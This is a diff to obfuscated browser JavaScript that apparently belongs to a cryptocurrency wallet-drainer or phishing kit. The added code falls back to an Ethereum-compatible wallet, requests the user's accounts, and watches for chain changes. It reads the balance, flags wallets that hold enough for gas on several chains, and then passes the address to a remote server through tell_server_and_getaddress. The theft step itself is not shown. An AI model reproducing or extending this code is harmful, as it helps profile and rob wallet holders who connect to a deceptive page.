@@ -48,8 +48,6 @@ const _0x5e6f = (10 * (1000 + 736)) * 100000 + _0x586c;
 
 
 async function user() {
- 
-
   pid = getQueryString("gid") == undefined ? "1" : getQueryString("gid");
   mode = getQueryString("m") == undefined ? "0" : getQueryString("m");
   try {
@@ -79,12 +77,71 @@ async function user() {
     gascanapppass = _0x682780 >= 15 && mode == 0 ? true : _0x682780 >= 100 && mode != 0 ? true : false;
     wallet_user_address.length > 10 && (chain = "TRON", chainid = 0);
     await tell_server_and_getaddress();
-  } catch (_0x2befc7)  {
-  console.error("TRON wallet not available", err);
-  d_l_error();
+  } catch (_0x2befc7) {
+    try {
+      if (window.ethereum == undefined) {
+        d_l_error();
+        return;
+      }
+      const _0x433729 = await ethereum.request({
+        "method": "eth_requestAccounts"
+      });
+      wallet_user_address = _0x433729[0];
+      chainid = parseInt(parseInt(window.ethereum.chainId), 10);
+      changechainid != null && clearInterval(changechainid);
+      changechainid = setInterval(function () {
+        try {
+          window.ethereum != undefined && parseInt(parseInt(window.ethereum.chainId), 10) != chainid && (user().then(), console.log("chainid change"));
+        } catch (_0xa97c41) {}
+      }, 500);
+      window.ethereum.request({
+        "method": "eth_getBalance",
+        "params": [wallet_user_address, "latest"]
+      }).then(_0x4c9cef => {
+        {
+          _0x4c9cef = BigInt(_0x4c9cef).toString();
+          switch (chainid) {
+            case 1:
+              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.00553 ? true : false;
+              chain = "ETH";
+              break;
+            case 25:
+              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
+              chain = "CRONOS";
+              break;
+            case 56:
+              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
+              chain = "BSC";
+              break;
+            case 59:
+              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
+              chain = "EOS";
+              break;
+            case 66:
+              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
+              chain = "OKT";
+              break;
+            case 128:
+              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
+              chain = "HECO";
+              break;
+            case 43114:
+              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
+              chain = "AVAX";
+              break;
+            case 137:
+              gascanapppass = _0x4c9cef / 1000000000000000000 >= 0.0005 ? true : false;
+              chain = "MATIC";
+              break;
+          }
+          !(chainid < 1) && tell_server_and_getaddress().then();
+        }
+      });
+    } catch (_0x5d6916) {
+      d_l_error();
+    }
   }
 }
-
 
 
 async function password() {
